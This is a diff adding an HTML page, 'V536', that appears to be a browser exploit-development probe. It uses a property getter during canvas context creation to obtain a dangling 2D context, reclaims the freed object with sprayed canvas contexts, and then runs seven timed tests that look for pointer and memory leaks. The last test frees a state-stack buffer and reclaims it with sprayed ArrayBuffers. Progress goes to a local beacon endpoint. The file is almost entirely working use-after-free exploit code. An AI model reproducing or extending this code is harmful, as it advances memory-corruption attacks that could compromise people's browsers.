@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V536</title>
+<style>body{font:11px monospace;background:#111;color:#0f0;margin:8px}
+#log{white-space:pre-wrap;word-break:break-all}</style>
+</head><body>
+<div id="log">V536 — Aliased pair pointer leak probing
+Loading...</div>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+='\n'+m}
+var T0=Date.now();
+function B(tag,body){
+  var msg='['+(Date.now()-T0)+'ms] '+(body||'');
+  log('>> '+tag+': '+msg);
+  try{var x=new XMLHttpRequest();x.open('POST','/beacon/V536-'+tag,false);
+  x.setRequestHeader('Content-Type','text/plain');x.send(msg)}catch(e){}
+}
+window.onerror=function(m,s,l,c,e){B('ONERROR',m+' at '+s+':'+l+':'+c)};
+B('BOOT',navigator.userAgent);
+
+// === Setup: Create aliased pair ===
+var dangling, official, officialCanvas;
+setTimeout(function(){
+  try{
+    B('SETUP-START','creating aliased pair');
+    var c = document.createElement('canvas');
+    c.width = 100; c.height = 100;
+    var inner = null;
+    var s = {};
+    Object.defineProperty(s, 'alpha', {
+      get: function() { inner = c.getContext('2d'); return true; }
+    });
+    c.getContext('bitmaprenderer', s);
+    if (!inner) { B('SETUP-FAIL','no inner'); return; }
+
+    // Same-type reclaim
+    var ctxs = [];
+    for (var i = 0; i < 200; i++) {
+      var nc = document.createElement('canvas');
+      nc.width = 100; nc.height = 100;
+      var nctx = nc.getContext('2d');
+      nctx.lineWidth = 200 + i;
+      ctxs.push({canvas: nc, ctx: nctx});
+    }
+
+    var dlw = inner.lineWidth;
+    if (dlw >= 200 && dlw < 400) {
+      var idx = dlw - 200;
+      dangling = inner;
+      official = ctxs[idx].ctx;
+      officialCanvas = ctxs[idx].canvas;
+      B('SETUP-OK','aliased at #'+idx+' lw='+dlw);
+    } else {
+      B('SETUP-MISS','lw='+dlw+' no alias');
+      return;
+    }
+
+    // Reset state
+    official.lineWidth = 1;
+    window._ctxs = ctxs;
+  } catch(e) { B('SETUP-ERR',''+e); }
+}, 200);
+
+// === T1: getLineDash — returns array from Vector<double> ===
+setTimeout(function(){
+  try{
+    if (!dangling) { B('T1-SKIP','no alias'); return; }
+    B('T1-START','getLineDash probe');
+
+    // Set lineDash through official
+    official.setLineDash([5, 10, 15, 20]);
+    var dash1 = official.getLineDash();
+    B('T1-OFFICIAL','getLineDash=['+dash1.join(',')+']');
+
+    // Read through dangling
+    var dash2 = dangling.getLineDash();
+    B('T1-DANGLING','getLineDash=['+dash2.join(',')+']');
+
+    // Force stateStack growth, then read lineDash
+    for (var i = 0; i < 20; i++) {
+      official.save();
+      official.setLineDash([i*10, i*10+5]);
+    }
+    // Realize
+    var rdash = official.getLineDash();
+    B('T1-GROWN','after 20 saves, dash=['+rdash.join(',')+']');
+
+    // Read through dangling
+    var ddash = dangling.getLineDash();
+    B('T1-DANG-GROWN','dangling dash=['+ddash.join(',')+']');
+
+    // Restore all
+    for (var i = 0; i < 20; i++) official.restore();
+  } catch(e) { B('T1-ERR',''+e); }
+}, 1500);
+
+// === T2: getTransform — returns DOMMatrix with 6 doubles ===
+setTimeout(function(){
+  try{
+    if (!dangling) { B('T2-SKIP','no alias'); return; }
+    B('T2-START','getTransform probe');
+
+    official.setTransform(1.5, 0.25, 0.75, 2.0, 100.5, 200.5);
+    var t1 = official.getTransform();
+    B('T2-OFFICIAL','a='+t1.a+' b='+t1.b+' c='+t1.c+' d='+t1.d+' e='+t1.e+' f='+t1.f);
+
+    var t2 = dangling.getTransform();
+    B('T2-DANGLING','a='+t2.a+' b='+t2.b+' c='+t2.c+' d='+t2.d+' e='+t2.e+' f='+t2.f);
+
+    official.resetTransform();
+  } catch(e) { B('T2-ERR',''+e); }
+}, 3000);
+
+// === T3: createLinearGradient — does toString/valueOf leak? ===
+setTimeout(function(){
+  try{
+    if (!dangling) { B('T3-SKIP','no alias'); return; }
+    B('T3-START','gradient probe');
+
+    var g = official.createLinearGradient(0, 0, 100, 100);
+    g.addColorStop(0, 'red');
+    g.addColorStop(1, 'blue');
+    official.fillStyle = g;
+
+    // Read fillStyle through both
+    var fs1 = official.fillStyle;
+    var fs2 = dangling.fillStyle;
+    B('T3-FS-TYPE','official='+typeof fs1+' dangling='+typeof fs2);
+    B('T3-FS-SAME','same object? '+(fs1===fs2));
+
+    // If gradient object, check its properties
+    if (typeof fs1 === 'object') {
+      var keys = [];
+      for (var k in fs1) keys.push(k);
+      B('T3-FS-KEYS','['+keys.join(',')+']');
+      B('T3-FS-STR','toString='+fs1.toString());
+      B('T3-FS-CTOR','constructor='+fs1.constructor.name);
+    }
+
+    official.fillStyle = '#000000';
+  } catch(e) { B('T3-ERR',''+e); }
+}, 4500);
+
+// === T4: createImageData — check backing store ===
+setTimeout(function(){
+  try{
+    if (!dangling) { B('T4-SKIP','no alias'); return; }
+    B('T4-START','ImageData probe');
+
+    // ImageData(192, 1) = 192*1*4 = 768 bytes backing store
+    var id1 = official.createImageData(192, 1);
+    B('T4-CREATED','ImageData '+id1.width+'x'+id1.height+' data.length='+id1.data.length);
+
+    // Fill with pattern
+    for (var i = 0; i < id1.data.length; i++) id1.data[i] = i & 0xFF;
+
+    // putImageData then getImageData
+    official.putImageData(id1, 0, 0);
+    var id2 = official.getImageData(0, 0, 192, 1);
+    B('T4-GET','getImageData data.length='+id2.data.length);
+
+    // Read through dangling
+    var id3 = dangling.getImageData(0, 0, 192, 1);
+    B('T4-DANG','dangling getImageData data.length='+id3.data.length);
+
+    // Check first 8 bytes
+    var hex = [];
+    for (var i = 0; i < 8; i++) hex.push(('0'+id3.data[i].toString(16)).slice(-2));
+    B('T4-DATA','first 8B: '+hex.join(' '));
+
+    // Check if data buffers share memory
+    var buf2 = id2.data.buffer;
+    var buf3 = id3.data.buffer;
+    B('T4-BUFS','same buffer? '+(buf2===buf3)+' sizes='+buf2.byteLength+','+buf3.byteLength);
+
+  } catch(e) { B('T4-ERR',''+e); }
+}, 6000);
+
+// === T5: measureText — returns TextMetrics with many float fields ===
+setTimeout(function(){
+  try{
+    if (!dangling) { B('T5-SKIP','no alias'); return; }
+    B('T5-START','measureText probe');
+
+    official.font = '16px serif';
+    var m1 = official.measureText('AAAA');
+    B('T5-OFF','width='+m1.width);
+
+    var m2 = dangling.measureText('AAAA');
+    B('T5-DANG','width='+m2.width);
+
+    // Extended metrics (may not exist)
+    var fields = ['actualBoundingBoxLeft','actualBoundingBoxRight',
+                  'actualBoundingBoxAscent','actualBoundingBoxDescent',
+                  'fontBoundingBoxAscent','fontBoundingBoxDescent',
+                  'emHeightAscent','emHeightDescent'];
+    var vals = [];
+    for (var i = 0; i < fields.length; i++) {
+      vals.push(fields[i]+'='+m1[fields[i]]);
+    }
+    B('T5-METRICS',vals.join(' | '));
+
+  } catch(e) { B('T5-ERR',''+e); }
+}, 7500);
+
+// === T6: isPointInPath/isPointInStroke — boolean oracles ===
+setTimeout(function(){
+  try{
+    if (!dangling) { B('T6-SKIP','no alias'); return; }
+    B('T6-START','path oracle probe');
+
+    official.beginPath();
+    official.rect(10, 10, 80, 80);
+
+    var p1 = official.isPointInPath(50, 50);
+    var p2 = dangling.isPointInPath(50, 50);
+    B('T6-PATH','official='+p1+' dangling='+p2);
+
+    var s1 = official.isPointInStroke(10, 10);
+    var s2 = dangling.isPointInStroke(10, 10);
+    B('T6-STROKE','official='+s1+' dangling='+s2);
+
+  } catch(e) { B('T6-ERR',''+e); }
+}, 9000);
+
+// === T7: stateStack buffer size probe ===
+setTimeout(function(){
+  try{
+    if (!dangling) { B('T7-SKIP','no alias'); return; }
+    B('T7-START','sizeof(State) estimation');
+
+    // Create fresh alias for this test
+    var c7 = document.createElement('canvas');
+    c7.width = 1; c7.height = 1;
+    var dang7 = null;
+    var s7 = {};
+    Object.defineProperty(s7, 'alpha', {
+      get: function() { dang7 = c7.getContext('2d'); return true; }
+    });
+    c7.getContext('bitmaprenderer', s7);
+
+    var ctxs7 = [];
+    for (var i = 0; i < 100; i++) {
+      var nc = document.createElement('canvas');
+      nc.width = 1; nc.height = 1;
+      var nctx = nc.getContext('2d');
+      nctx.lineWidth = 300 + i;
+      ctxs7.push({canvas: nc, ctx: nctx});
+    }
+    var dlw7 = dang7.lineWidth;
+    if (dlw7 < 300 || dlw7 >= 400) { B('T7-NO-ALIAS','lw='+dlw7); return; }
+    var aidx7 = dlw7 - 300;
+    var off7 = ctxs7[aidx7].ctx;
+    B('T7-ALIAS','at #'+aidx7);
+
+    // Force stateStack growth with diverse state
+    for (var i = 0; i < 32; i++) {
+      off7.save();
+      off7.lineWidth = 1000 + i;
+      off7.globalAlpha = (i+1)/33;
+      off7.setLineDash([i*2, i*2+1]);
+      off7.setTransform(1+i*0.01, 0, 0, 1+i*0.01, i, i);
+      off7.font = (10+i)+'px serif';
+      off7.fillStyle = 'rgba('+(i*8)+',0,0,1)';
+    }
+
+    // Realize by reading
+    var flw = off7.lineWidth;
+    B('T7-REALIZED','32 saves realized, lw='+flw);
+
+    // Now free the aliased context
+    // Create bitmaprenderer on the same canvas → frees the context + stateStack buffer
+    var s7b = {};
+    Object.defineProperty(s7b, 'alpha', { get: function() { return true; } });
+    ctxs7[aidx7].canvas.getContext('bitmaprenderer', s7b);
+    B('T7-FREED','context freed');
+
+    // The stateStack buffer is now freed too
+    // Its size = capacity * sizeof(State)
+    // capacity was grown from 1 to >= 32 (probably 32 or 64)
+    // Try various AB sizes to reclaim it
+    var sizes = [4096, 8192, 12288, 16384, 24576, 32768, 49152, 65536];
+    for (var si = 0; si < sizes.length; si++) {
+      var spray = [];
+      for (var j = 0; j < 50; j++) {
+        var ab = new ArrayBuffer(sizes[si]);
+        var dv = new DataView(ab);
+        // Write marker pattern
+        dv.setFloat64(0, 3.14159 + si + j*0.0001, true);
+        dv.setFloat64(8, 2.71828 + si + j*0.0001, true);
+        spray.push(ab);
+      }
+
+      // Try reading lineWidth through dangling — if stateStack buffer was
+      // reclaimed by an AB of this size, lineWidth will read our float64 marker
+      try {
+        var tlw = dang7.lineWidth;
+        B('T7-SIZE-'+sizes[si],'lw='+tlw);
+        if (tlw !== flw && tlw !== 1 && !isNaN(tlw)) {
+          B('T7-HIT','SIZE '+sizes[si]+' RECLAIMED — lw='+tlw);
+          // Also check other state fields
+          try {
+            var tga = dang7.globalAlpha;
+            B('T7-HIT-GA','globalAlpha='+tga);
+          } catch(e) {}
+          try {
+            var ttd = dang7.getLineDash();
+            B('T7-HIT-DASH','lineDash=['+ttd.join(',')+']');
+          } catch(e) {}
+          break;
+        }
+      } catch(e) {
+        B('T7-SIZE-'+sizes[si]+'-ERR',''+e);
+        break;
+      }
+    }
+
+  } catch(e) { B('T7-ERR',''+e); }
+}, 11000);
+
+setTimeout(function(){B('COMPLETE','all tests done')},16000);
+</script></body></html>
